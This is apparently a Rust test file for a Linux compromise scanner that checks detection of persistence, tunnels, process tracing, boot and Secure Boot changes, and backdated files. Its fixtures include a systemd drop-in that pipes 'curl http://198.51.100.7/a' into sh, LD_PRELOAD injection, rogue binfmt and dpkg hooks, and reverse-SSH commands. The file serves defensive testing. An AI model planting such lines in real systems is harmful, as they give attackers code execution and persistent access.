//! Startup tricks, process and tunnel checks, kernel and boot state, file times and the
//! changes-only view, with made-up files in a temporary directory.

use scanner::baseline::{self, newly_tracked, Baseline};
use scanner::config::Config;
use scanner::modules::kernelstate::{decode_taint, judge_bpf, parse_boot_entry, parse_bpftool};
use scanner::modules::net_proc::ps_differences;
use scanner::modules::netwatch::iptables_redirects;
use scanner::modules::persistence::hooks::{git_run_settings, package_settings, parse_binfmt, unknown_in_initramfs};
use scanner::modules::procwatch::{judge_mount, judge_trace, parse_mount};
use scanner::modules::tunnels::{is_declared, is_reverse_ssh, wireguard_peers};
use scanner::modules::Collector;
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::collections::HashSet;
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;
use std::time::{Duration, SystemTime};

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn bytes(root: &Path, abs: &str, content: &[u8]) {
    write(root, abs, "");
    fs::write(root.join(abs.trim_start_matches('/')), content).expect("write");
}

fn program(root: &Path, abs: &str, content: &str) {
    write(root, abs, content);
    fs::set_permissions(root.join(abs.trim_start_matches('/')), fs::Permissions::from_mode(0o755)).expect("chmod");
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

fn of<'a>(report: &'a Report, rule: &str) -> Vec<(Severity, &'a str)> {
    report.findings.iter().filter(|f| f.rule == rule).map(|f| (f.severity, f.title.as_str())).collect()
}

#[test]
fn generators_dropins_binfmt_git_and_installer_settings() {
    assert_eq!(parse_binfmt("enabled\ninterpreter /usr/bin/python3.13\nflags: \noffset 0\n"), Some((true, "/usr/bin/python3.13".into(), String::new())));
    assert_eq!(git_run_settings("[core]\n\thooksPath = /tmp/h\n\tfsmonitor = true\n[alias]\n x = y\n"), vec![("core.hookspath".to_string(), "/tmp/h".to_string())]);
    let pip = package_settings("[global]\nindex-url = https://user:secret@pkgs.example.org/simple\nextra-index-url =\n  https://pypi.org/simple\n  http://198.51.100.7/s\n", false);
    assert_eq!(pip.len(), 2, "{pip:?}");
    assert!(pip.iter().all(|(_, l)| !l.contains("secret")));
    let npm = package_settings("//registry.npmjs.org/:_authToken=abc123\nregistry=https://registry.npmjs.org/\nscript-shell=/tmp/sh\n", true);
    assert_eq!(npm, vec![(Severity::High, "script-shell = /tmp/sh".to_string())]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/var/lib/dpkg/info/base.list", "/usr/lib/systemd/system-generators/known\n/usr/bin/python3.13\n/etc/systemd/system/pkg.service.d/pkg.conf\n");
    write(root, "/usr/lib/systemd/system-generators/known", "x");
    program(root, "/etc/systemd/system-generators/extra", "#!/bin/sh\n/tmp/.x &\n");
    write(root, "/etc/systemd/system/ssh.service.d/10-evil.conf", "[Service]\nExecStartPre=/bin/sh -c 'curl http://198.51.100.7/a | sh'\n");
    write(root, "/etc/systemd/system/cron.service.d/env.conf", "[Service]\nEnvironment=LD_PRELOAD=/usr/lib/x.so\n");
    write(root, "/etc/systemd/system/getty.service.d/extra.conf", "[Service]\nExecStartPost=/usr/bin/true\n");
    write(root, "/etc/systemd/system/nice.service.d/nice.conf", "[Service]\nNice=5\n");
    write(root, "/etc/systemd/system/pkg.service.d/pkg.conf", "[Service]\nExecStartPre=/usr/bin/true\n");
    write(root, "/proc/sys/fs/binfmt_misc/python3.13", "enabled\ninterpreter /usr/bin/python3.13\nflags: \n");
    write(root, "/proc/sys/fs/binfmt_misc/evil", "enabled\ninterpreter /tmp/.i\nflags: C\n");
    write(root, "/proc/sys/fs/binfmt_misc/status", "enabled\n");
    program(root, "/etc/.git/hooks/pre-commit", "#!/bin/sh\netckeeper pre-commit -d /etc\n");
    program(root, "/opt/app/.git/hooks/post-merge", "#!/bin/sh\nmake\n");
    write(root, "/opt/app/.git/hooks/update.sample", "x");
    write(root, "/etc/npmrc", "registry=http://198.51.100.7/\n");
    write(root, "/etc/dpkg/dpkg.cfg.d/zz", "post-invoke=/tmp/.hook\n");
    write(root, "/usr/share/initramfs-tools/scripts/init-top/planted", "echo\n");
    let report = scan(root, &[ModuleId::Persistence]);

    assert_eq!(of(&report, "PERS-SYSTEMD-GENERATOR").len(), 1);
    let drops = of(&report, "PERS-SYSTEMD-DROPIN");
    assert_eq!(drops.len(), 3, "{drops:?}");
    assert!(drops.iter().any(|(s, t)| *s == Severity::Critical && t.contains("ssh.service")));
    assert!(drops.iter().any(|(s, t)| *s == Severity::High && t.contains("cron.service")));
    assert!(drops.iter().any(|(s, t)| *s == Severity::Medium && t.contains("getty.service")));
    assert_eq!(of(&report, "PERS-BINFMT").iter().map(|f| f.0).collect::<Vec<_>>(), vec![Severity::Critical]);
    let git = of(&report, "PERS-GIT-HOOK");
    assert_eq!(git.len(), 1, "{git:?}");
    assert!(git[0].1.ends_with("post-merge"));
    assert_eq!(of(&report, "PERS-PKG-CONFIG").len(), 1);
    assert_eq!(of(&report, "PERS-DPKG-HOOK").len(), 1);
    assert_eq!(of(&report, "PERS-INITRAMFS-HOOK").len(), 1);
    let recorded = &report.inventory.persistence_files;
    assert!(recorded.contains_key("/etc/systemd/system/ssh.service.d/10-evil.conf"));
    assert!(newly_tracked("/etc/systemd/system/ssh.service.d/10-evil.conf") && newly_tracked("/opt/app/.git/hooks/post-merge"));
    assert!(!newly_tracked("/etc/systemd/system/new.service"), "new services are never played down");
}

#[test]
fn unexplained_files_in_a_boot_image() {
    let entries = [".", "scripts", "scripts/init-top", "scripts/init-top/udev", "scripts/init-top/ORDER", "scripts/init-top/zz-implant", "usr", "usr/bin", "usr/bin/ls", "usr/bin/ash", "usr/bin/dropper", "usr/lib/modules/x.ko"];
    let applets: HashSet<String> = ["ash".to_string()].into_iter().collect();
    let exists = |p: &str| p == "/usr/share/initramfs-tools/scripts/init-top/udev" || p == "/usr/bin/ls";
    assert_eq!(unknown_in_initramfs(&entries, &exists, &applets), vec!["scripts/init-top/zz-implant".to_string(), "usr/bin/dropper".to_string()]);
}

#[test]
fn tracing_mounts_and_process_lists() {
    assert_eq!(judge_trace("sshd", "/usr/sbin/sshd", "inject", "/tmp/inject"), Some(Severity::Critical));
    assert_eq!(judge_trace("sudo", "/usr/bin/sudo", "strace", "/usr/bin/strace"), Some(Severity::High));
    assert_eq!(judge_trace("myapp", "/home/a/myapp", "gdb", "/usr/bin/gdb"), Some(Severity::Low));
    assert_eq!(judge_trace("myapp", "/home/a/myapp", "gdb", "/tmp/gdb"), Some(Severity::High));
    assert_eq!(judge_trace("firefox-esr", "/usr/lib/firefox-esr/firefox-esr", "crashhelper", "/usr/lib/firefox-esr/crashhelper"), None);

    let (point, root, kind, _) = parse_mount("40 27 8:1 /tmp/empty /proc/1234 rw shared:1 - ext4 /dev/sda1 rw").expect("mount");
    assert_eq!(judge_mount(&point, &root, &kind).map(|m| m.0), Some(Severity::Critical));
    assert_eq!(judge_mount("/usr/bin/ps", "/tmp/fake", "ext4").map(|m| m.0), Some(Severity::High));
    assert_eq!(judge_mount("/etc/cron.d", "/", "tmpfs").map(|m| m.0), Some(Severity::High));
    for (p, r, k) in [("/usr", "/", "ext4"), ("/proc/sys/fs/binfmt_misc", "/", "binfmt_misc"), ("/run/user/1000", "/", "tmpfs"), ("/etcetera", "/x", "ext4")] {
        assert_eq!(judge_mount(p, r, k), None, "{p}");
    }

    let set = |v: &[u32]| v.iter().copied().collect::<HashSet<u32>>();
    let (from_ps, from_proc) = ps_differences(&set(&[1, 2, 3]), &set(&[1, 3, 9]), &set(&[1, 2, 3, 4]));
    assert_eq!(from_ps.into_iter().collect::<Vec<_>>(), vec![2]);
    assert_eq!(from_proc.into_iter().collect::<Vec<_>>(), vec![9]);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/1/mountinfo", "40 27 8:1 /tmp/e /proc/77 rw - ext4 /dev/sda1 rw\n");
    write(root, "/proc/50/status", "Name:\tsshd\nUid:\t0 0 0 0\nTracerPid:\t60\n");
    write(root, "/proc/60/status", "Name:\tinject\nUid:\t0 0 0 0\nTracerPid:\t0\n");
    symlink("/usr/sbin/sshd", root.join("proc/50/exe")).expect("link");
    symlink("/tmp/inject", root.join("proc/60/exe")).expect("link");
    let report = scan(root, &[ModuleId::ProcAudit]);
    assert_eq!(of(&report, "PROC-TRACED").iter().map(|f| f.0).collect::<Vec<_>>(), vec![Severity::Critical]);
    assert_eq!(of(&report, "PROC-HIDDEN-MOUNT").len(), 1);
}

#[test]
fn tunnels_and_redirects() {
    let args = |s: &str| s.split(' ').map(String::from).collect::<Vec<_>>();
    for yes in ["ssh -R 8080:localhost:22 host", "ssh -NfR8080:localhost:22 host", "autossh -M 0 -o RemoteForward=1:x:2 host", "ssh -o RemoteForward 1:x:2 host"] {
        assert!(is_reverse_ssh(&args(yes)), "{yes}");
    }
    for no in ["ssh host", "ssh -L 8080:localhost:80 host", "ssh -i R.key host", "ssh -p22 -v host -- -r", "ssh -oUser=Robert host"] {
        assert!(!is_reverse_ssh(&args(no)), "{no}");
    }
    let configs = vec![("/etc/wireguard/wg0.conf".to_string(), "[Interface]\n".to_string()), ("/etc/systemd/network/10.netdev".to_string(), "[NetDev]\nName=gre1\n".to_string())];
    assert!(is_declared("wg0", "WireGuard", &configs, false));
    assert!(is_declared("gre1", "GRE", &configs, false));
    assert!(!is_declared("wg1", "WireGuard", &configs, false));
    assert!(is_declared("tun0", "TUN/TAP", &configs, true) && !is_declared("tun0", "TUN/TAP", &configs, false));
    let peers = wireguard_peers("wg0\tPRIVATE\tPUB\t51820\toff\nwg0\tPEERKEY\t(none)\t198.51.100.7:1\t10.0.0.2/32\t0\t0\t0\toff\n");
    assert_eq!(peers.len(), 1);
    assert_eq!(peers[0].1, "PEERKEY");
    assert_eq!(iptables_redirects("*nat\n-A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n-A DOCKER -j DNAT --to-destination 172.17.0.2\n-A POSTROUTING -j MASQUERADE\n").len(), 1);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/sys/class/net/wg9/uevent", "DEVTYPE=wireguard\nINTERFACE=wg9\n");
    write(root, "/sys/class/net/gre0/type", "778\n");
    write(root, "/sys/class/net/eth0/type", "1\n");
    write(root, "/proc/70/status", "Name:\tchisel\nUid:\t1000 1000 1000 1000\n");
    symlink("/home/anna/chisel", root.join("proc/70/exe")).expect("link");
    let report = scan(root, &[ModuleId::NetProc]);
    assert_eq!(of(&report, "NET-TUNNEL-IFACE").len(), 1);
    assert_eq!(of(&report, "NET-TUNNEL-PROGRAM").iter().map(|f| f.0).collect::<Vec<_>>(), vec![Severity::High]);
}

/// An EFI load option as efivarfs shows it.
fn boot_entry(description: &str, file: &str) -> Vec<u8> {
    let utf16 = |s: &str| s.encode_utf16().chain([0]).flat_map(u16::to_le_bytes).collect::<Vec<u8>>();
    let path = utf16(file);
    let mut node = vec![4, 4];
    node.extend(((path.len() + 4) as u16).to_le_bytes());
    node.extend(path);
    node.extend([0x7f, 0xff, 4, 0]);
    let mut out = vec![7, 0, 0, 0, 1, 0, 0, 0];
    out.extend((node.len() as u16).to_le_bytes());
    out.extend(utf16(description));
    out.extend(node);
    out
}

#[test]
fn ebpf_taint_secure_boot_and_boot_changes() {
    assert_eq!(parse_boot_entry(&boot_entry("debian", "\\EFI\\debian\\shimx64.efi")), Some(("debian".into(), "\\EFI\\debian\\shimx64.efi".into())));
    assert_eq!(parse_boot_entry(&[1, 2, 3]), None);
    assert_eq!(decode_taint(4097).iter().map(|m| m.0).collect::<String>(), "PO");

    let programs = parse_bpftool(r#"[{"id":1,"type":"cgroup_device","name":"sd_devices"},{"id":2,"type":"kprobe","name":"hide","pids":[]},{"id":3,"type":"tracing","name":"mon","pids":[{"pid":5,"comm":"falco"}]}]"#);
    assert_eq!(programs.len(), 2);
    let mut col = Collector::default();
    judge_bpf(&programs, &[], &mut col);
    assert_eq!(col.findings[0].severity, Severity::Medium);
    assert!(col.findings[0].evidence.lines().next().expect("line").contains("hide"));
    let mut col = Collector::default();
    judge_bpf(&programs[1..], &[], &mut col);
    assert_eq!(col.findings[0].severity, Severity::Low);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    let efi = |name: &str| format!("/sys/firmware/efi/efivars/{name}-8be4df61-93ca-11d2-aa0d-00e098032b8c");
    write(root, "/proc/modules", "good 1 0 - Live 0x0\n");
    write(root, "/proc/sys/kernel/tainted", "8192\n");
    write(root, "/sys/kernel/security/lockdown", "none [integrity] confidentiality\n");
    bytes(root, &efi("SecureBoot"), &[6, 0, 0, 0, 1]);
    bytes(root, &efi("BootOrder"), &[7, 0, 0, 0, 0, 0]);
    bytes(root, &efi("Boot0000"), &boot_entry("debian", "\\EFI\\debian\\shimx64.efi"));
    let before = scan(root, &[ModuleId::Kernel]);
    assert_eq!(of(&before, "KERN-TAINTED").iter().map(|f| f.0).collect::<Vec<_>>(), vec![Severity::Medium], "the unsigned module is gone");
    assert!(of(&before, "KERN-SECUREBOOT").is_empty() && of(&before, "KERN-BOOT-ENTRY").is_empty());
    assert_eq!(before.inventory.boot.get("secure_boot").map(String::as_str), Some("on"));

    bytes(root, &efi("SecureBoot"), &[6, 0, 0, 0, 0]);
    write(root, "/sys/kernel/security/lockdown", "[none] integrity confidentiality\n");
    bytes(root, &efi("BootOrder"), &[7, 0, 0, 0, 1, 0, 0, 0]);
    bytes(root, &efi("Boot0001"), &boot_entry("update", "\\EFI\\x\\evil.efi"));
    let after = scan(root, &[ModuleId::Kernel]);
    assert_eq!(of(&after, "KERN-BOOT-ENTRY").len(), 1);
    let base = Baseline::from_report(&before);
    let (changes, _) = baseline::compare(&base, &after.inventory, &after.modules);
    let rules: HashSet<&str> = changes.iter().map(|f| f.rule.as_str()).collect();
    for rule in ["BASE-SECUREBOOT-OFF", "BASE-LOCKDOWN-OFF", "BASE-BOOT-ENTRY-NEW", "BASE-BOOT-ORDER"] {
        assert!(rules.contains(rule), "{rule}: {rules:?}");
    }
}

#[test]
fn backdated_and_rewritten_programs() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    // the package list is "installed" now; the files are written now too, so nothing is later
    write(root, "/usr/bin/packaged", "original");
    write(root, "/var/lib/dpkg/info/pkg.list", "/usr/bin/packaged\n");
    write(root, "/var/lib/dpkg/info/pkg.md5sums", "919c8b643b7133116b02fc0d9bb7df3f  usr/bin/packaged\n");
    program(root, "/usr/bin/implant", "x");
    write(root, "/etc/cron.d/fine", "x");
    let old = SystemTime::now() - Duration::from_secs(400 * 86_400);
    fs::File::options().write(true).open(root.join("usr/bin/implant")).expect("open").set_modified(old).expect("touch");
    let report = scan(root, &[ModuleId::FsPerms]);
    let times: Vec<_> = report.findings.iter().filter(|f| f.rule == "FS-TIMESTAMP").collect();
    assert_eq!(times.len(), 1);
    assert!(times[0].evidence.contains("/usr/bin/implant") && !times[0].evidence.contains("packaged"), "{}", times[0].evidence);
    assert!(of(&report, "FS-PACKAGE-CHANGED").is_empty());
}

#[test]
fn changes_only_keeps_the_differences() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path().join("root");
    write(&root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\n");
    let first = scan(&root, &[ModuleId::Persistence]);
    let file = dir.path().join("baseline.json");
    Baseline::from_report(&first).save(&file).expect("save");
    write(&root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\ntoor:x:0:0::/root:/bin/sh\nnewuser:x:1005:1005::/home/newuser:/bin/bash\n");
    let opts = ScanOptions { modules: vec![ModuleId::Persistence], baseline_compare: Some(file), ..ScanOptions::default() };
    let mut report = run_scan(&SysRoot::new(&root), &Config::default(), &opts, &|_| {});
    assert!(report.has_rule("PERS-UID0"));
    report.keep_only_changes();
    assert!(!report.has_rule("PERS-UID0") && report.has_rule("BASE-ACCOUNT-NEW"));
    assert!(report.findings.iter().all(|f| f.rule.starts_with("BASE-")));
    assert_eq!(report.summary.total, report.findings.len());
    assert!(report.notes[0].starts_with("Changes only"));
}
